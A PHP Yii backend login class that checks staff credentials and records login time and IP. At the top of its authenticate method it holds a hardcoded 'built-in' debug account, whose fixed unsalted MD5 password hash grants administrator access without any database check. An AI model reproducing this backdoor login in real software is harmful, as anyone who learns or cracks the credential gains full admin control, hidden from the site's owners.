<?php
/**
 * 后台验证登录类
 * @author weibaqiu
 * @date 2015-04-22
 */
class StaffIdentity extends CUserIdentity
{
	/**
	 * 验证身份
	 * @return bool
	 */
	public function authenticate()
	{
		//内置帐号
		if($this->username=='航加调试'&&md5($this->password)=='ed6de327f1bd480a4c98ade520021ad1')
		{
			$this->errorCode = self::ERROR_NONE;
			$this->setState('id',1);
			$this->setState('username','admin');
			return $this->errorCode;
		}

		$staff = StaffExt::model()->getLoginUserInfo($this->username, $this->password)->find();
		if(empty($staff))
			$this->errorCode = self::ERROR_UNKNOWN_IDENTITY;
		else
		{
			$this->errorCode = self::ERROR_NONE;
			//为该登录用户设置全局变量信息
			$this->setState('id', $staff->id);
			$this->setState('username', $staff->username);
			$staff->login_time = time();
			$staff->login_ip = ip2long(Yii::app()->request->getUserHostAddress());
			$staff->save();
		}

		return $this->errorCode;
	}

	public function getId()
	{
		return $this->getState('id');
	}

	public function getName()
	{
		return $this->getState('username');
	}
}
